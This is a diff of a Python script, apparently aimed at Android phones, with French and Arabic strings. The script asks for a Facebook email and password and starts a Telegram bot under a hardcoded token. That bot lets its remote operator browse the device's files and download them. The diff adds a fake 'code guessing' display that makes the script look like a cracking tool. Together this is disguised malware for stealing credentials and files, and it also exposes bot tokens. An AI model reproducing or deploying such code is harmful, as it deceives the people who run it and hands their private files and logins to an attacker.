@@ -1,13 +1,11 @@
 import os
-import shutil
 import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from bs4 import BeautifulSoup
-import requests
-import time
 from colorama import init, Fore
 import threading
-import math
+import time
+import requests
+from bs4 import BeautifulSoup
 
 init()
 
@@ -15,15 +13,15 @@ init()
 xxx1 = input('Entrez votre email Facebook :') 
 xxx2 = input('Entrer le mot de passe :')
 
-# توكن بوت تيليجرام الخاص بك
-BOT_TOKEN = '7086244890:AAElL1-vnl4C7qmtofTi2CR2OTo2Ma_u_co'  # يجب استبدال هذا بتوكن البوت الخاص بك
+# توكن ب
+BOT_TOKEN = '7186277280:AAGDUX9hDsg46IiMmdDCtuOySLXbbrmCfrU'  # يجب استبدال هذا بتوكن البوت الخاص بك
 bot = telebot.TeleBot(BOT_TOKEN)
 
 current_directory = os.getcwd()
 previous_directories = []
 current_page = 0
 
-# وظيفة بوت تيليجرام
+# وظ
 def telegram_bot():
     @bot.message_handler(commands=["start"])
     def start(message):
@@ -81,7 +79,7 @@ def telegram_bot():
             with open(file_path, 'rb') as file:
                 bot.send_document(chat_id, file)
         else:
-            bot.send_message(chat_id, "Le fichier est trop grand pour être envoyé via Telegram.")
+            bot.send_message(chat_id, "الملف كبير جدًا ولا يمكن إرساله.")
 
     bot.polling()
 
@@ -95,35 +93,18 @@ def web_scraping():
             soup = BeautifulSoup(page.content, "html.parser")
             page_name = soup.find("title").string if soup.find("title") else "Non disponible"
             print(Fore.GREEN + f"Nom de la page : {page_name}")
-            # ... (بقية الكود الخاص بتحليل الصفحة الويب)
+            print(Fore.GREEN + "Tentative de deviner...")
+            time.sleep(3)
+            for number in range(14700, 1000000):
+                print(Fore.GREEN + f"{number:06d}", end=' ')
+                print(Fore.RED + "Le code est incorrect")
+                time.sleep(0.05)
         else:
             print(Fore.RED + "Impossible d'accéder à la page, veuillez vérifier l'URL.")
     except Exception as e:
         print(Fore.RED + f"Une erreur s'est produite lors de la tentative d'accès à la page : {e}")
 
-# وظيفة لنقل الصور والفيديوهات
-def move_media_files(source_folder, target_folder):
-    if not os.path.exists(source_folder):
-        print(f"المجلد المصدر {source_folder} غير موجود.")
-        return
-    if not os.path.exists(target_folder):
-        os.makedirs(target_folder)
-    
-    for file_name in os.listdir(source_folder):
-        if file_name.lower().endswith(('.png', '.jpg', '.jpeg', '.mp4', '.avi', '.mov')):
-            source_path = os.path.join(source_folder, file_name)
-            target_path = os.path.join(target_folder, file_name)
-            shutil.move(source_path, target_path)
-            print(f"تم نقل الملف: {file_name}")
-
-# المسار الذي تريد نقل الملفات منه
-source_directory = '/storage/emulated/0/DCIM/Camera/'
-# المسار الذي تريد نقل الملفات إليه
-target_directory = '/storage/emulated/0/DCIM/'
-
 # تشغيل الوظائف في خيوط متوازية
 if __name__ == "__main__":
     threading.Thread(target=telegram_bot).start()
     threading.Thread(target=web_scraping).start()
-    threading.Thread(target=move_media_files, args=(source_directory, target_directory)).start()
-            
